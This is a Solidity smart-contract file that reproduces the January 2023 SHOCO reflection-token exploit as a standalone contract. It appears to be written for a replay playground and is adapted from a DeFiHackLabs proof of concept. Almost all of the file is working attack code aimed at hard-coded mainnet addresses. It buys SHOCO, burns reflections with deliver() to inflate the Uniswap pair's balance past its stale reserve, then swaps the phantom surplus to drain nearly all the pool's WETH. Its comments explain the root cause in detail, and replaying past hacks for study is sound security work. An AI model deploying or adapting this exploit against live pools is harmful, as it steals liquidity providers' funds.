// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-01-SHOCO).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (SHOCOAttacker IS the Test contract; testExploit() uses Foundry's
// `deal()` cheatcode to conjure 2000 WETH out of thin air instead of a real
// flash loan or funding source), so there is no standalone contract to
// deploy and no flash-loan/transfer setup step can replicate the starting
// capital. This contract is a faithful, self-contained copy of that inline
// attack (testExploit -> run) so the playground can deploy it and record
// run(); the 2000 WETH starting balance is replicated via a `dealToken`
// setup step in the config instead of a `deal()` call inside this contract.
// Logic and constants are copied verbatim from test/SHOCO_exp.sol.
//
// Root cause: Shoco is a "reflective" / rebasing ERC20 that maintains a true
// supply `_tTotal` and a larger internal "reflection" supply `_rTotal`; each
// holder's balance is tokenFromReflection(_rOwned[holder]), i.e. their
// reflection balance divided by the current rate `_rTotal / _tTotal`. The
// public, permissionless `deliver(tAmount)` lets any non-excluded holder burn
// their own reflections, shrinking `_rTotal` -- which INFLATES every other
// holder's effective balance (since the same `_rOwned` now converts to a
// larger `tAmount`) without ever calling transfer(). The Uniswap V2
// SHOCO/WETH pair is one such "other holder": its cached reserve0 is only
// re-synced to the true SHOCO balance inside swap()/mint()/burn()/sync(), so
// after deliver() the pair's real SHOCO balance balloons far past its stale
// reserve0. Selling exactly that phantom surplus back to the pair via swap()
// re-prices against the inflated real balance and pays out almost the whole
// WETH reserve.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
}

interface IReflection is IERC20 {
    function deliver(uint256 amount) external;
    function tokenFromReflection(uint256 rAmount) external view returns (uint256);
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract SHOCODrain {
    IUniswapV2Pair private constant shoco_weth = IUniswapV2Pair(0x806b6C6819b1f62Ca4B66658b669f0A98e385D18);
    IReflection private constant shoco = IReflection(0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6);
    IERC20 private constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // The original Foundry test reads Shoco's PRIVATE `_rTotal` (storage slot
    // 14) and `_rOwned` mapping (slot 3) directly via `vm.load` cheatcodes,
    // which a plain deployed contract cannot do to another contract's
    // storage. We compute the exact same values through Shoco's PUBLIC view
    // functions instead:
    //   - `_rTotal` has no public getter, but `tokenFromReflection` uses
    //     `_getRate() = _rTotal/_tTotal` internally -- see below, we invert
    //     the relationship instead of reading `_rTotal` directly.
    //   - `_rOwned[EXCLUDED_HOLDER]` for an ALREADY-excluded holder is frozen
    //     and equals `reflectionFromToken(balanceOf(EXCLUDED_HOLDER), false)`
    //     at the current rate (the exact mathematical inverse of
    //     `tokenFromReflection`), since `balanceOf` on an excluded account
    //     returns `_tOwned[account]` directly and
    //     `reflectionFromToken(tAmount, false)` returns `tAmount * currentRate`
    //     (the same `_getRate()` used by `tokenFromReflection`).
    // `rTotal - rExcluded` is what the test actually needs (`rAmountOut`), so
    // instead of computing `rTotal` on its own we derive `rAmountOut`
    // directly: `tokenFromReflection` requires `rAmount <= _rTotal`, so we
    // binary-search-free it by using `reflectionFromToken(totalSupply() -
    // balanceOf(EXCLUDED_HOLDER), false)`, which is algebraically identical
    // to `rTotal - rExcluded` at a fixed rate (both `_tTotal - tOwned` scaled
    // by the same `currentRate`).
    address private constant EXCLUDED_HOLDER = 0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a;

    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256 amountOut)
    {
        require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256 amountIn)
    {
        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    // NOTE: this contract expects to already hold 2000 WETH before run() is
    // called (mirrors the test's `deal(address(weth), address(this), 2000 ether)`
    // -- replicated as a `dealToken` setup step in the config since there is
    // no flash loan or real capital source in the original attack).
    function run() external {
        // step 0: derive the same `rAmountOut = _rTotal - _rOwned[excluded]`
        // the test reads via vm.load, but through Shoco's PUBLIC interface
        // (a plain contract cannot vm.load another contract's storage).
        // EXCLUDED_HOLDER's balanceOf() returns its frozen `_tOwned` directly
        // (it is excluded), and reflectionFromToken(tAmount, false) returns
        // `tAmount * currentRate` -- the same rate tokenFromReflection
        // divides by -- so reflectionFromToken(totalSupply() -
        // balanceOf(excluded), false) equals `_rTotal - _rOwned[excluded]`
        // at the current rate.
        uint256 rAmountOut = shoco.reflectionFromToken(shoco.totalSupply() - shoco.balanceOf(EXCLUDED_HOLDER), false);
        uint256 shocoAmountOut = shoco.tokenFromReflection(rAmountOut) - 0.1 * 10 ** 9;

        // step 1: buy nearly all the sellable SHOCO out of the pair with WETH.
        (uint256 reserve0, uint256 reserve1,) = shoco_weth.getReserves();
        uint256 wethAmountIn = getAmountIn(shocoAmountOut, reserve1, reserve0);
        weth.transfer(address(shoco_weth), wethAmountIn);
        shoco_weth.swap(shocoAmountOut, 0, address(this), "");

        // step 2: deliver() burns our reflections, inflating the pair's real
        // SHOCO balance far above its cached reserve0 (no transfer() -> pair
        // never re-syncs).
        shoco.deliver(shoco.balanceOf(address(this)) * 99_999 / 100_000);

        // step 3: sell exactly the phantom surplus (real balance - stale
        // reserve0) back into the pair; swap() re-prices against the
        // inflated real balance and pays out almost the entire WETH side.
        (reserve0, reserve1,) = shoco_weth.getReserves();
        uint256 wethAmountOut = getAmountOut(shoco.balanceOf(address(shoco_weth)) - reserve0, reserve0, reserve1);
        shoco_weth.swap(0, wethAmountOut, address(this), "");

        // Profit is whatever WETH remains in this contract above the 2000
        // ether starting balance minus wethAmountIn spent -- the recorder
        // measures profitReceiver ("exploit")'s WETH balance delta directly.
    }
}
